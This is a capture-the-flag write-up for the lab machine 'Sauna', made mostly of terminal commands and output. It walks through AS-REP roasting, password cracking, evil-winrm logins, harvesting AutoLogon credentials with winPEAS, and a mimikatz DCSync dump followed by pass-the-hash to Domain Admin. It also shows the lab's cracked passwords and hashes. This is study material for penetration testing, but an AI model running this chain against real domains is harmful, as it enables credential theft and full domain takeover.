Sauna

// recon

root@kali:/bk# nmap -A -T4 -p- 10.10.10.175
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-12 01:10 EDT
Nmap scan report for 10.10.10.175
Host is up (0.30s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-12 12:20:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
64228/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/12%Time=5E92A49A%P=i686-pc-linux-gnu%r(DNSVer
SF:sionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x0
SF:4bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h02m40s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-12T12:23:27
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   316.49 ms 10.10.14.1
2   316.86 ms 10.10.10.175


// found a website on IIS, checked the web, did the dirb. +.  wfuzz , nothing valuable. 

// this is an AD server as there is port 389 and 88 opened 
// ddi the Nmap script scan and  using PYTHON TOOLs to check

root@kali:/bk# nmap -n -sV -script "ldap*" -p 389 10.10.10.175 

|         msDS-NcType: 0
|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
|         dc: EGOTISTICAL-BANK
|     dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL

// found sth interesting as Hugo + Smith existed in their website! 

// try this tool package 
https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py

root@kali:/bk/impacket/examples# python GetADUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -all
Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation

[*] Querying 10.10.10.175 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------

// no users listed 

// try this package for getting the hash file , but you have to guess the username which existed in the AD
// make the user list file 

// Created list like this with different combinations

Hugo 
fsmith 
hugo 
smith 
Fergus 
hbear 
Shaun 
Coins 
Bowie 
Taylor 
Sophie 
Driver 
Steven  
Kerb 
Fergus Smith 
Hugo Bear 
Shaun Coins

// run GetNPUsers to get the hash file, then use John to crack it

root@kali:/bk/impacket/examples# python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile 175.txt -outputfile 175.hash -dc-ip 10.10.10.175 
Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

root@kali:/bk/impacket/examples# cat 175.hash 

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5ae007b2f9f58200bd4beda9c3711333$e5795c94c5293df796dc31017e2aec111d86a8ddac39aafa37243d45a1680a0f7853fa88c7ad8cb491927df6f8a4e29545357d2253cd3db5f4aac9049332b1bfbd1b7869a4b7a975654899f831192ab18de173d7ea0ed26f39e8ec87f54396b2f188c1b9fe0ef6f234b840ab0d4ba5ac298cc1fcc4bf8cdeb3b60beb2b998ed7cf6dc22369b83de158c62a1642b7fb3da03735d0ef9c54bf75d020a0ff7434d357120a45beb2e6333e21573350f262867f9ca7889692a780f3c6ac44880cde403a9a3ec1ab8755fce38c40fea4618c36c5c03cfe81748fa7ebae7a68fffd5018f04eeb8b741ba60a8a0d5aac1c834663dc40a75fc4388f92f48602f4ba742bda

root@kali:/bk/impacket/examples# john --wordlist=/bk/rockyou.txt 175.hash 

Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 32/32])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:29 DONE (2020-04-12 03:34) 0.03336g/s 351641p/s 351641c/s 351641C/s Theturtle15..Theroostersrule$
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali:/bk/impacket/examples# evil-winrm -i 10.10.10.175 -u fsmith -p "Thestrokes23"

*Evil-WinRM* PS C:\Users\FSmith> cd Desktop
*Evil-WinRM* PS C:\Users\FSmith\Desktop> ls -force


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2020  10:03 AM             34 user.txt


*Evil-WinRM* PS C:\Users\FSmith\Desktop> cat user.txt


################# root privileges escalation ######

*Evil-WinRM* PS C:\Users\FSmith\Documents> net view \\10.10.14.54
Shared resources at \\10.10.14.54

Samba 4.11.5-Debian

Share name  Type  Used as  Comment

-------------------------------------------------------------------------------
bk          Disk           bk
nc          Disk           nc
The command completed successfully.

// from the kali vm ,download this tool,
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe

*Evil-WinRM* PS C:\Users\FSmith\Documents> cp \\10.10.14.54\bk\winPEAS.exe .
*Evil-WinRM* PS C:\Users\FSmith\Documents> ls


    Directory: C:\Users\FSmith\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/12/2020   9:18 AM              0 m_winPEAS.exe
-a----        4/12/2020   1:16 AM        1649712 PowerUp.ps1
-a----        4/12/2020   3:02 AM         241664 winPEAS.exe
-a----        4/12/2020   1:46 AM              0 winPEASany.exe


*Evil-WinRM* PS C:\Users\FSmith\Documents> ./winPEAS.exe

ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
   Creating Dynamic lists, this could take a while, please wait...
   - Checking if domain...
   - Getting Win32_UserAccount info...

[+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

// this tools will run all the vulnerability reports in the screen ，found default id

root@kali:/bk# evil-winrm -i 10.10.10.175 -u svc_loanmgr -p "Moneymakestheworldgoround!"

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> ls


    Directory: C:\Users\svc_loanmgr\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/12/2020  12:18 PM         228352 winpeas.exe


*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> cp \\10.10.14.30\bk\mimikatz.exe .


// this time，use mimikatz.exe to sync the administrator account to the local
https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200308-1

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> ./mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Mar  8 2020 18:30:37
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /user:Administrator
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 1/24/2020 10:14:15 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff         // this is credential ! 
    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: ee8c50e6bc332970a8e8a632488f5211


root@kali:/bk# evil-winrm -i 10.10.10.175 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
egotisticalbank\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /all

USER INFORMATION
----------------

User Name                     SID
============================= =============================================
egotisticalbank\administrator S-1-5-21-2966785786-3096785034-1186376766-500


GROUP INFORMATION
-----------------

Group Name                                             Type             SID                                           Attributes
====================================================== ================ ============================================= ===============================================================
Everyone                                               Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                 Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                          Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access             Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                                   Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                       Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                         Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
EGOTISTICALBANK\Group Policy Creator Owners            Group            S-1-5-21-2966785786-3096785034-1186376766-520 Mandatory group, Enabled by default, Enabled group
EGOTISTICALBANK\Domain Admins                          Group            S-1-5-21-2966785786-3096785034-1186376766-512 Mandatory group, Enabled by default, Enabled group
EGOTISTICALBANK\Schema Admins                          Group            S-1-5-21-2966785786-3096785034-1186376766-518 Mandatory group, Enabled by default, Enabled group
EGOTISTICALBANK\Enterprise Admins                      Group            S-1-5-21-2966785786-3096785034-1186376766-519 Mandatory group, Enabled by default, Enabled group
EGOTISTICALBANK\Denied RODC Password Replication Group Alias            S-1-5-21-2966785786-3096785034-1186376766-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                       Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                   Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt









